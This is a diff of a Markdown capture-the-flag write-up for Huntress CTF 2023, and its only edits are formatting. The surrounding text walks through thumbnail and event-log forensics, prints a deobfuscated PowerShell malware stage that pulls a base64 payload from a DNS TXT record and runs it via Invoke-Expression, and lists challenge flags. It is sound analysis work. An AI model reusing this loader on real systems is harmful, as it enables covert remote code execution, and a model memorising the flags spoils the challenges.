@@ -53,8 +53,6 @@ Download and run this [tool](https://thumbcacheviewer.github.io/). There are onl
 
 ![thumbs](/assets/img/huntress_ctf23/thumbs.png)
 
-Find flag in one of the thumbnails:
-
 **`flag{human_after_all}`**
 
 # Tragedy Redux - Medium
@@ -164,7 +162,9 @@ With the above code I was able to extract the flag:
 
 _Ugh! One of our users was trying to install a Texas Chainsaw Massacre video game, and installed malware instead. Our EDR detected a rogue process reading and writing events to the Application event log. Luckily, it killed the process and everything seems fine, but we don't know what it was doing in the event log._
 
-Open log with `Event Log Explorer` and find an entry under event ID 1337 while scrolling. Confirm the game name and a big hex blob. Copy this into CyberChef and convert from hex to get what appears to be a heavily obfuscated PowerShell script. I decided to use `pwsh` in my Remnux host to try and deobfuscate by utilising `Write-Host` and omitting any commands I can that would try to run the code. First pass:
+Open log with `Event Log Explorer` and find an entry under event ID 1337 while scrolling. Confirm the game name and a big hex blob. Copy this into CyberChef and convert from hex to get what appears to be a heavily obfuscated PowerShell script. I decided to use `pwsh` in my Remnux host to try and deobfuscate by utilising `Write-Host` and omitting any commands I can that would try to run the code. 
+
+First pass:
 
 ![texas1](/assets/img/huntress_ctf23/texas1.png)
 
@@ -182,7 +182,7 @@ As can be seen, there is a base64 encoded string in there. Pop it into CyberChef
 try {$TGM8A = Get-WmiObject MSAcpi_ThermalZoneTemperature -Namespace "root/wmi" -ErrorAction 'silentlycontinue' ; if ($error.Count -eq 0) { $5GMLW = (Resolve-DnsName eventlog.zip -Type txt | ForEach-Object { $_.Strings }); if ($5GMLW -match '^[-A-Za-z0-9+/]*={0,3}$') { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($5GMLW)) | Invoke-Expression } } } catch { }
 ```
 
-Check the TXT record for the domain eventlog.zip using this [site](https://centralops.net/co/) to find another base64 string containing the flag:
+Check the TXT record for the domain `eventlog.zip` using this [site](https://centralops.net/co/) to find another base64 string containing the flag:
 
 **`flag{409537347c2fae01ef9826c2506ac660}`**
 
